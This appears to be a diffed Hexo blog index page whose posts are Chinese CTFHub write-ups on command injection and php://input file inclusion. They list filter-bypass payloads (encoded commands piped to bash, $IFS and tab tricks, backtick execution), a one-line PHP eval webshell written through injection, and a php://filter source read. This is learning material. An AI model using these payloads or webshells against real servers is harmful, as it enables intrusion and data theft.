@@ -1,0 +1,148 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.1" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.1" type="image/png" sizes="32x32"><meta property="og:type" content="website">
+<meta property="og:title" content="WhiteFlame">
+<meta property="og:url" content="https://blog.flame8.xyz/index.html">
+<meta property="og:site_name" content="WhiteFlame">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="WhiteFlame">
+<meta name="twitter:card" content="summary"><title>WhiteFlame</title><link ref="canonical" href="https://blog.flame8.xyz/index.html"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.1"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">WhiteFlame</div><div class="header-banner-info__subtitle">以纯白之焰，寄吾之愿于余温</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content content-home" id="content"><section class="postlist"><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/01/22/CommandInjection/">CTFHub命令注入</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2021-01-22</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2021-01-22</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>5天的时间已经过去了3天，今天抓紧时间搞完RCE任务。</p>
+
+        <h3 id="过滤cat"   >
+          <a href="#过滤cat" class="heading-link"><i class="fas fa-link"></i></a>过滤cat</h3>
+      <p>方法很多，我抖了个机灵用的是tac。</p>
+<p>在linux中与cat有类似功能的还有如下字符 <code>more、less、head、tail、nl、sed、sort、uniq、rev</code> 找到一个替换的即可。（<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/Jim2g/articles/13641685.html%EF%BC%89" >https://www.cnblogs.com/Jim2g/articles/13641685.html）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>网上其他人的办法：</p>
+
+        <h5 id="1-反斜杠绕过"   >
+          <a href="#1-反斜杠绕过" class="heading-link"><i class="fas fa-link"></i></a>1.反斜杠绕过</h5>
+      <p>比如：ca\t fl\ag</p>
+
+        <h5 id="2-单引号和双引号绕过"   >
+          <a href="#2-单引号和双引号绕过" class="heading-link"><i class="fas fa-link"></i></a>2.单引号和双引号绕过</h5>
+      <p>比如：ca’ ‘t flag 或ca” “t flag</p>
+<p>网上其他人的方法：</p>
+
+        <h5 id="1、一句话木马-https-blog-csdn-net-helen1994-article-details-112577757"   >
+          <a href="#1、一句话木马-https-blog-csdn-net-helen1994-article-details-112577757" class="heading-link"><i class="fas fa-link"></i></a>1、一句话木马(https://blog.csdn.net/helen1994/article/details/112577757)</h5>
+      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;echo -e &quot;&lt;?php @eval(\$_POST[&#39;test&#39;]);?&gt;&quot; &gt; 555.php</span><br></pre></td></tr></table></div></figure>
+<p>⚠️：POST函数前面有一个<code>\</code>如果不写这个的话，$_POST会被解析为shell变量，从而变为@eval([‘test’]);导致失效。</p>
+
+        <h5 id="2、绕过关键字的形式-https-blog-csdn-net-helen1994-article-details-112577757"   >
+          <a href="#2、绕过关键字的形式-https-blog-csdn-net-helen1994-article-details-112577757" class="heading-link"><i class="fas fa-link"></i></a>2、绕过关键字的形式(https://blog.csdn.net/helen1994/article/details/112577757)</h5>
+      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;a&#x3D;c;b&#x3D;at;$a$b rce.php</span><br></pre></td></tr></table></div></figure>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;a&#x3D;c;b&#x3D;at;$&#123;a&#125;$&#123;b&#125; rce_ping.php</span><br></pre></td></tr></table></div></figure>
+<p>原作者试了下，在这道题是不行的，但是在别的地方就是行。</p>
+
+        <h3 id="过滤空格"   >
+          <a href="#过滤空格" class="heading-link"><i class="fas fa-link"></i></a>过滤空格</h3>
+      <p>替代品：&lt; 、&lt;&gt;、%20(space)、 %09(tab)、$IFS$9、 ${IFS}、$IFS</p>
+<p>但在本题中&lt;&gt;无效，原因不明。</p>
+
+        <h3 id="过滤目录分隔符"   >
+          <a href="#过滤目录分隔符" class="heading-link"><i class="fas fa-link"></i></a>过滤目录分隔符</h3>
+      <p>替代品：</p>
+
+        <h5 id="1-编码绕过："   >
+          <a href="#1-编码绕过：" class="heading-link"><i class="fas fa-link"></i></a>1.编码绕过：</h5>
+      <p>base64:<br>echo MTIzCg==|base64 -d 其将会打印123<br>echo “Y2F0IC9mbGFn”|base64-d|bash ==&gt;cat /flag</p>
+<p>hex:<br>echo “636174202f666c6167” | xxd -r -p|bash ==&gt;cat /flag</p>
+<p>oct:<br>$(printf “\154\163”) ==&gt;ls<br>$(printf “\x63\x61\x74\x20\x2f\x66\x6c\x61\x67”) ==&gt;cat /flag<br>{printf,”\x63\x61\x74\x20\x2f\x66\x6c\x61\x67”}|$0 ==&gt;cat /flag<br>#可以通过这样来写webshell,内容为<?php @eval($_POST['c']);?><br>${printf,”\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76”} &gt;&gt; 1.php</p>
+<p>但我尝试了base64，并没有成功，原因不明。</p>
+<p>网上其他人的办法：</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;cd flag_is_here;cat flag_1633660217512.php</span><br></pre></td></tr></table></div></figure>
+
+        <h3 id="过滤运算符"   >
+          <a href="#过滤运算符" class="heading-link"><i class="fas fa-link"></i></a>过滤运算符</h3>
+      <p>运用上一办法，依然可用。</p>
+
+        <h3 id="综合过滤练习"   >
+          <a href="#综合过滤练习" class="heading-link"><i class="fas fa-link"></i></a>综合过滤练习</h3>
+      
+        <h5 id="1-0a-回车-“”隔断绕过："   >
+          <a href="#1-0a-回车-“”隔断绕过：" class="heading-link"><i class="fas fa-link"></i></a>1.%0a(回车) + “”隔断绕过：</h5>
+      <p>发现不能出现空格%20。</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;challenge-a546dde4d7ec9184.sandbox.ctfhub.com:10080&#x2F;?ip&#x3D;0.0.0.0%0acd%20fl%22%22ag_is_here%0a</span><br></pre></td></tr></table></div></figure>
+<p>回显：</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] &#x3D;&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [0] &#x3D;&gt;  </span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [1] &#x3D;&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [0] &#x3D;&gt;  </span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></div></figure>
+<p>替换空格为Tab</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0.0.0.0%0acd%09fl&quot;&quot;ag_is_here%0a%0ac&quot;&quot;at%09fla&quot;&quot;g_9464253794166.php</span><br></pre></td></tr></table></div></figure>
+<p>之后可以获得flag</p>
+
+        <h5 id="2-8进制转换"   >
+          <a href="#2-8进制转换" class="heading-link"><i class="fas fa-link"></i></a>2.8进制转换</h5>
+      <p>先ls</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0.0.0.0%0a$(printf%09&quot;\154\163&quot;)</span><br></pre></td></tr></table></div></figure>
+<p>回显</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] &#x3D;&gt; PING 0.0.0.0 (0.0.0.0): 56 data bytes</span><br><span class="line">    [1] &#x3D;&gt; flag_is_here</span><br><span class="line">    [2] &#x3D;&gt; index.php</span><br><span class="line">)</span><br></pre></td></tr></table></div></figure>
+<p>再ls flag_is_here</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0.0.0.0%0a$(printf%09&quot;\x6C\x73\x20\x66\x6C\x61\x67\x5F\x69\x73\x5F\x68\x65\x72\x65&quot;)</span><br></pre></td></tr></table></div></figure>
+<p>回显</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] &#x3D;&gt; PING 0.0.0.0 (0.0.0.0): 56 data bytes</span><br><span class="line">    [1] &#x3D;&gt; flag_317581303125673.php</span><br><span class="line">)</span><br></pre></td></tr></table></div></figure>
+<p>再cat一次就获取到了</p>
+
+        <h3 id="附加内容"   >
+          <a href="#附加内容" class="heading-link"><i class="fas fa-link"></i></a>附加内容</h3>
+      <p><strong>知识点：反引号执行系统命令</strong>（<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/Jim2g/articles/13641685.html%EF%BC%89" >https://www.cnblogs.com/Jim2g/articles/13641685.html）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><strong>payload：c=echo <code>cat f\*</code>;</strong></p>
+<p>因为过滤了system，我们就得选择其他的命令执行函数了</p>
+<p>常见的有如下几个，其中system是有回显的，其他的就得需要我们自行输出。调用echo或者其他输出函数即可。</p>
+<p>system() passthru() exec() shell_exec() popen() proc_open() pcntl_exec() 反引号 同shell_exec()</p>
+
+        <h5 id="POST传入"   >
+          <a href="#POST传入" class="heading-link"><i class="fas fa-link"></i></a>POST传入</h5>
+      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;include&quot;$_POST[1]“?&gt; 1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></div></figure></div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/01/19/ctfhub-web-php-input/">ctfhub web php://input</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2021-01-19</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2021-01-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>那天跟着视频做了一遍，今天又忘了。</p>
+<img src=".\image-20210119102049623.png" alt="image-20210119102049623" style="zoom:50%;" />
+
+<p>看到这道题，没有直接的shell、phpinfo()也没有什么有用的信息。回过头来看题目“php://input”，这是要往网页里面输入东西；再看源代码中include()函数，豁然开朗。这是典型的文件包含漏洞，构造如下URL：</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;challenge-069202b3ff05ecbe.sandbox.ctfhub.com:10080&#x2F;?file&#x3D;php:&#x2F;&#x2F;input</span><br></pre></td></tr></table></div></figure>
+<p>并POST</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">&quot;cat ../../../flag_xxxxx&quot;</span>);</span><br></pre></td></tr></table></div></figure>
+<p>得到flag</p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/01/18/hello-world/">Hello World</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2021-01-18</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2021-01-18</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>Welcome to <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://hexo.io/" >Hexo</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>! This is your very first post. Check <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://hexo.io/docs/" >documentation</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> for more info. If you get any problems when using Hexo, you can find the answer in <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html" >troubleshooting</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> or you can ask me on <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues" >GitHub</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>.</p>
+
+        <h2 id="Quick-Start"   >
+          <a href="#Quick-Start" class="heading-link"><i class="fas fa-link"></i></a>Quick Start</h2>
+      
+        <h3 id="Create-a-new-post"   >
+          <a href="#Create-a-new-post" class="heading-link"><i class="fas fa-link"></i></a>Create a new post</h3>
+      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></div></figure>
+<p>More info: <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html" >Writing</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h3 id="Run-server"   >
+          <a href="#Run-server" class="heading-link"><i class="fas fa-link"></i></a>Run server</h3>
+      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></div></figure>
+<p>More info: <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://hexo.io/docs/server.html" >Server</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h3 id="Generate-static-files"   >
+          <a href="#Generate-static-files" class="heading-link"><i class="fas fa-link"></i></a>Generate static files</h3>
+      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></div></figure>
+<p>More info: <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html" >Generating</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h3 id="Deploy-to-remote-sites"   >
+          <a href="#Deploy-to-remote-sites" class="heading-link"><i class="fas fa-link"></i></a>Deploy to remote sites</h3>
+      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></div></figure>
+<p>More info: <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html" >Deployment</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</div></div></article></section><nav class="paginator"><div class="paginator-inner"><span class="page-number current">1</span></div></nav></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><section class="sidebar-toc hide"></section><!-- ov = overview--><section class="sidebar-ov"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/stun-logo.svg" alt="avatar"></div><p class="sidebar-ov-author__text">hello world</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">3</div><div class="sidebar-ov-state-item__name">归档</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2021</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>WhiteFlame</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v5.3.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.1</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.6.1"></script><script src="/js/stun-boot.js?v=2.6.1"></script><script src="/js/scroll.js?v=2.6.1"></script><script src="/js/header.js?v=2.6.1"></script><script src="/js/sidebar.js?v=2.6.1"></script></body></html>
